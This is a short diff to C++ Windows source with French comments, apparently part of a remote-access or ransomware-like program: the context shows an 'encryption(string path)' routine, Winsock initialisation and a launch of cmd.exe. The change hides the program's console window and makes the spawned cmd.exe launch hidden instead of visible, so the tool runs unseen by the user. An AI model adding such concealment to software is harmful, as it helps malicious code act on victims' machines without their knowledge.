@@ -40,8 +40,7 @@ void encryption(string path);
 int main() {
 
 	// Cacher la fênêtre d'execution
-	//ShowWindow(GetConsoleWindow(), SW_HIDE);
-	//ShowWindow(GetConsoleWindow(), SW_RESTORE);
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 	// Initialisation de WinShock
 
@@ -117,7 +116,7 @@ int main() {
 
 				HINSTANCE instanceCMD;
 
-				instanceCMD = ShellExecute(NULL, L"open", L"cmd.exe", NULL, NULL, SW_SHOWNORMAL);
+				instanceCMD = ShellExecute(NULL, L"open", L"cmd.exe", NULL, NULL, SW_HIDE);
 
 				if (instanceCMD <= (HINSTANCE)32) {
 					cout << errorMsg << "Le lancement du CMD a echoue. Erreur #" << GetLastError() << endl;
